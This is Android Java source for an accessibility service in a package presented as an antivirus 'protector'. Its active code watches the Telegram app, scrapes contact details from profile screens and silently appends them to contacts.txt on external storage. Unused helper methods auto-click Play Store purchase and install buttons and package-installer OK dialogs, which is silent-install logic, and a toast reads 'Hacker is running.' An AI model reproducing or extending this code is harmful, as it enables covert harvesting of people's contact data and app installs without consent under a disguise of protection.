package somee.com.antivirus.protector;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

import static android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
import static somee.com.antivirus.protector.MainActivity.getCurrentTimeStamp;
import static somee.com.antivirus.protector.MainActivity.serviceRunningKey;
//import static lock.somee.com.antivirus.MainActivity.getCurrentTimeStamp;
//import static lock.somee.com.antivirus.MainActivity.serviceRunningKey;

/**
 * Created by owner on 25/08/2016.
 */

public class ShieldProtector extends AccessibilityService {



    @Override
    public void onCreate() {
        //getServiceInfo().flags = AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        Log.v(TAG, "Service Created");
        //android.os.Debug.waitForDebugger();
        //openDB();

        //Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        //startActivity(intent);
        ////startActivityForResult(intent, 0);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //closeDB();
        removeRunningKey();
    }


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        String viewIdResourceName ="";
        AccessibilityNodeInfo source = event.getSource();
        packageName = "";




        if (event.getPackageName() != null && event.getPackageName().toString()!=null )
            packageName = event.getPackageName().toString();

        /*if (source != null && packageName.contains(("android.youtube"))){
            if (source.getViewIdResourceName() != null) {
                viewIdResourceName = source.getViewIdResourceName();
            }

            while (source.getParent() != null) {
                source = source.getParent();
            }


            String xml = CreateVirtualViewXml(source, "", "");

            if (xml.contains("com.google.android.youtube:id/skip_ad_button")){
                //Log.e(TAG, xml);
                sendActions(event);
                showFeedback("Skipped Ad by Skip Youtube Ads");
                Log.e(TAG, "sent click");
            }

        }*/

        if (source != null && (packageName.contains("android.settings") || packageName.contains("com.android.systemui") ))
        {
            if(source != null) {
                String xml1 = CreateVirtualViewXml(source, "", "");
                if (xml1.contains("Skip Youtube Ads")) {
                showFeedback("Hacker is running.");
                }
            }
        }

        if (source != null && packageName.contains(("org.telegram.messenger"))) {
            if (source.getViewIdResourceName() != null) {
                viewIdResourceName = source.getViewIdResourceName();
            }

            while (source.getParent() != null) {
                source = source.getParent();
            }


            String xml = CreateVirtualViewXml(source, "", "");
            String userData ="";
            if (isToCaptureTelegramScreen(xml))
                userData = CreateVirtualViewText(source, "", "");
                if (userData != "") {
                    Log.e(TAG, userData);
                    appendToFile(userData);
                }
            }



        }

        //Log.v(TAG, String.format(
         //    "onAccessibilityEventNew: [PN] %s [type] %s [class] %s [id] %s [package] %s [time] %s",packageName,
          //      idToText(event), event.getClassName(), viewIdResourceName, event.getPackageName(), event.getEventTime()));

    String lastAddedLine = "";
    String path = Environment.getExternalStorageDirectory().getPath() + "/contacts.txt";
private void appendToFile(String data){

    if (data.equalsIgnoreCase(lastAddedLine) )
        return;

    lastAddedLine = data;

    File file = new File(path);
    if (!file.exists()) {
        try {
            file.createNewFile();
        } catch (IOException ioe) {
            ioe.printStackTrace();
            showFeedback("error " + ioe.getMessage());
        }
    }
    try {
        FileOutputStream fileOutputStream = new FileOutputStream(file,true);
        OutputStreamWriter writer = new OutputStreamWriter(fileOutputStream);
        writer.append(data);
        writer.append('\n');
        writer.close();
        fileOutputStream.close();
        showFeedback("Contact Saved");
    } catch (FileNotFoundException e) {
        e.printStackTrace();
        showFeedback("error " + e.getMessage());
    } catch (IOException e) {
        e.printStackTrace();
        showFeedback("error " + e.getMessage());
    }



}





    private boolean isToCaptureTelegramScreen(String xml){

        String[] words = new String[]{  "Go back",
                                        "Call","Mobile","Info"
        };

        for (int i=0;i<words.length;i++ ){
            if(!xml.contains((words[i]))){
                return false;
            }
        }

        return true;
    }

    String packageName="";

    private void showFeedback(String message)
    {
        final Toast toast = Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT);
        toast.show();

        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                toast.cancel();
            }
        }, 2000);

    }

private boolean isDuringInstalation=false;

    private void sendActions(AccessibilityEvent event){

        try {

            if(packageName.equalsIgnoreCase("com.google.android.youtube")){
                AccessibilityNodeInfo nodeInfo = event.getSource();

                if (nodeInfo == null) {
                    return;
                }
                //Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
                List<AccessibilityNodeInfo> list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("com.google.android.youtube:id/skip_ad_button");
                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: action_button " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
        }catch (Exception e){

        }
    }

    private void sendActions1(AccessibilityEvent event){
        if (packageName.equalsIgnoreCase("com.android.vending")) {
            AccessibilityNodeInfo nodeInfo = event.getSource();
            //Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
            if (nodeInfo == null) {
                return;
            }


            List<AccessibilityNodeInfo> list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.vending:id/buy_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: buy_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

            list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.vending:id/continue_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: continue_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

            list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.vending:id/launch_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: launch_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

        }
        else if(packageName.equalsIgnoreCase("com.android.settings")){
            AccessibilityNodeInfo nodeInfo = event.getSource();

            if (nodeInfo == null) {
                return;
            }
            //Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
            List<AccessibilityNodeInfo> list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: action_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("android:id/summary");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: action_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }else if(packageName.equalsIgnoreCase("com.android.packageinstaller")){
            AccessibilityNodeInfo nodeInfo = event.getSource();

            if (nodeInfo == null) {
                return;
            }
           // Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
            List<AccessibilityNodeInfo> list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("android:id/button1");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: android:id/button1 " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

           list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/ok_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: ok_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }


        }
    }

    public static boolean openApp(Context context, String packageName) {
        PackageManager manager = context.getPackageManager();
        Intent i = manager.getLaunchIntentForPackage(packageName);
        if (i == null) {
            return false;
            //throw new PackageManager.NameNotFoundException();
        }
        // i.addCategory(Intent.CATEGORY_LAUNCHER);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        Bundle bundle = new Bundle();
        bundle.putString("key", "key");
        context.startActivity(i,bundle);
        return true;


        /*Intent myIntent = new Intent(String.valueOf(Main2Activity.class));
        myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(myIntent);
        return true;*/
    }

    private void openMarket(final String appPackageName){
        try {
            //startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        } catch (android.content.ActivityNotFoundException anfe) {
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }
    }



    private boolean isInstalled = false;
    private boolean isRunning = false;

    private boolean isAppRunning(String appPackageName){
        boolean ret=false;
        final ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        final List<ActivityManager.RunningAppProcessInfo> recentTasks = activityManager.getRunningAppProcesses();

        for (int i = 0; i < recentTasks.size(); i++)
        {
            String pn = recentTasks.get(i).processName;
            if(pn.equalsIgnoreCase(appPackageName)) {
                //Log.d("Executed app", "Application executed : " + recentTasks.get(i).baseActivity.toShortString() + "\t\t ID: " + recentTasks.get(i).id + "");
                ret = true;
                break;
            }
            break;
        }
        return ret;
    }

    private boolean isAppInstalled(String appPackageName){
        boolean ret=false;
        PackageManager packageManager = getPackageManager();

        // Get a list of the installed applications
        List<PackageInfo> listOfApps = packageManager.getInstalledPackages(0);//getInstalledApplications(PackageManager.GET_META_DATA);

        for (int i = 0; i < listOfApps.size(); i++)
        {
            String pn = listOfApps.get(i).packageName;
            if(pn.equalsIgnoreCase(appPackageName)) {
                //Log.d("Executed app", "Application executed : " + recentTasks.get(i).baseActivity.toShortString() + "\t\t ID: " + recentTasks.get(i).id + "");
                ret = true;
            }
        }
        return ret;
    }

    static final String TAG = "cbx";

    @Override
    public void onInterrupt() {
        Log.v(TAG, "INTERRUPTED");
        removeRunningKey();
    }




    private void updateRunningKey(){
        SharedPreferences sp = getSharedPreferences("your_prefs", Activity.MODE_PRIVATE);
        SharedPreferences.Editor editor = sp.edit();
        editor.putString(serviceRunningKey, getCurrentTimeStamp() );
        editor.commit();
    }

    private void removeRunningKey(){
        SharedPreferences sp = getSharedPreferences("your_prefs", Activity.MODE_PRIVATE);
        SharedPreferences.Editor editor = sp.edit();
        editor.remove(serviceRunningKey);
        editor.commit();
    }

    private String basePakagaName;
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.v(TAG, "AccessibilityService allowed");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        //info.flags = AccessibilityServiceInfo.DEFAULT ;
        info.flags = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK | AccessibilityEvent.TYPE_VIEW_CLICKED | AccessibilityEvent.TYPE_VIEW_FOCUSED | AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_VISUAL;
        info.notificationTimeout = 1000;
        setServiceInfo(info);


    }


    /**
     * Converts an ID returned by AccessibilityEvent.getEventType()
     * to a representative String
     */
    private String idToText(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_START";
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_END";
            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START:
                return "TYPE_TOUCH_INTERACTION_START";
            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_END:
                return "TYPE_TOUCH_INTERACTION_END";
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                return "TYPE_GESTURE_DETECTION_START";
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                return "TYPE_GESTURE_DETECTION_END";
            case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                return "TYPE_VIEW_HOVER_ENTER";
            case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                return "TYPE_VIEW_HOVER_EXIT";
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                return "TYPE_VIEW_SCROLLED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED";
            case TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                return "TYPE_ANNOUNCEMENT";
            case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
                return "TYPE_WINDOWS_CHANGED";
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                return "TYPE_WINDOW_CONTENT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                return "TYPE_VIEW_TEXT_SELECTION_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
                return "TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY";
            case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED:
                return "TYPE_VIEW_CONTEXT_CLICKED";
        }
        return "Unknown";
    }


    /**
     * Converts gestureID to a representative String
     *
     * @param gID
     * @return
     */
    private String gIdToString(int gID) {
        switch (gID) {
            case 1:
                return "GESTURE_SWIPE_UP";
            case 2:
                return "GESTURE_SWIPE_DOWN";
            case 3:
                return "GESTURE_SWIPE_LEFT";
            case 4:
                return "GESTURE_SWIPE_RIGHT";
            case 5:
                return "GESTURE_SWIPE_LEFT_AND_RIGHT";
            case 6:
                return "GESTURE_SWIPE_RIGHT_AND_LEFT";
            case 7:
                return "GESTURE_SWIPE_UP_AND_DOWN";
            case 8:
                return "GESTURE_SWIPE_DOWN_AND_UP";
            case 9:
                return "GESTURE_SWIPE_LEFT_AND_UP";
            case 10:
                return "GESTURE_SWIPE_LEFT_AND_DOWN";
            case 11:
                return "GESTURE_SWIPE_RIGHT_AND_UP";
            case 12:
                return "GESTURE_SWIPE_RIGHT_AND_DOWN";
            case 13:
                return "GESTURE_SWIPE_UP_AND_LEFT";
            case 14:
                return "GESTURE_SWIPE_UP_AND_RIGHT";
            case 15:
                return "GESTURE_SWIPE_DOWN_AND_LEFT";
            case 16:
                return "GESTURE_SWIPE_DOWN_AND_RIGHT";
        }
        return "UNKNOWN";
    }


    private String CreateVirtualViewXml(AccessibilityNodeInfo source, String eventType, String eventSource) {
        //testReflection(source);

        String textData = "";
        if (source.getText() != null) {
            textData = source.getText().toString();
        } else if (source.getContentDescription() != null) {
            textData = source.getContentDescription().toString();
        }


        StringBuilder sb = new StringBuilder();

        sb.append("<View>");

        if (eventType != "") {
            sb.append("<Properties>");
            sb.append("<EventType>");
            sb.append(eventType);
            sb.append("</EventType>");
            sb.append("<AppSource>");
            sb.append(eventSource);
            sb.append("</AppSource>");
            sb.append("<DateTime>");
            //DateFormat df = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");
            //String datetime = df.format(Calendar.getInstance().getTime());
            //sb.append(datetime);
            //sb.append(DBAdapter.getDateTime());
            sb.append("</DateTime>");
            eventType = "";
            sb.append("</Properties>");
        }

        sb.append("<Text>");
        sb.append(textData);
        sb.append("</Text>");

        sb.append("<Type>");
        String type = "unknowen";

        if (source.getClassName() != null) {
            type = source.getClassName().toString();
            //if(type.equalsIgnoreCase("TextView"))// == "android.widget.ImageView")
            // testReflection(event);
        }

        sb.append(type);
        //if(type.contains("Image"))// == "android.widget.ImageView")
        //    testActions(source);

        sb.append("</Type>");

        sb.append("<ViewIdResorceName>");
        sb.append(source.getViewIdResourceName());
        sb.append("</ViewIdResorceName>");


        sb.append("<ChildViews>");
        if (source.getChildCount() > 0) {
            for (int i = 0; i < source.getChildCount(); i++) {
                if(source.getChild(i) != null)
                    sb.append(CreateVirtualViewXml(source.getChild(i), eventType, ""));
            }
        }
        sb.append("</ChildViews>");

        sb.append("</View>");

        //Log.v("DetailedXML", sb.toString());

        return sb.toString();
    }

    private String CreateVirtualViewText(AccessibilityNodeInfo source, String eventType, String eventSource) {
        //testReflection(source);

        String textData = "";
        if (source.getText() != null) {
            textData = source.getText().toString();
        } else if (source.getContentDescription() != null) {
            textData = source.getContentDescription().toString();
        }

        if (    textData.equalsIgnoreCase("Null") || textData.startsWith("android."))
            textData="";

        StringBuilder sb = new StringBuilder();

        String[] words = new String[]{"Go back","Call","More options","Profile picture","Waiting for network...","Open chat","Username","Notifications","On","Start Secret Chat"};

        if (  textData != ""  ) {
            boolean is_to_add = true;
            for (int i=0;i<words.length;i++ ){
                if (textData == words[i]) {
                    is_to_add = false;
                    break;
                }
            }
            if (is_to_add){
                for (int i=0;i<words.length;i++ ){
                    if (textData == words[i]) {
                        is_to_add = false;
                        break;
                    }
                }
                if (is_to_add) {
                    sb.append(textData);
                    sb.append(",");
                }
            }
        }


        String type = "unknowen";

        if (source.getClassName() != null) {
            type = source.getClassName().toString();
        }

        //sb.append(type);

        if (source.getChildCount() > 0) {
            for (int i = 0; i < source.getChildCount(); i++) {
                if(source.getChild(i) != null)
                    sb.append(CreateVirtualViewText(source.getChild(i), eventType, ""));
            }
        }

        return sb.toString();
    }
}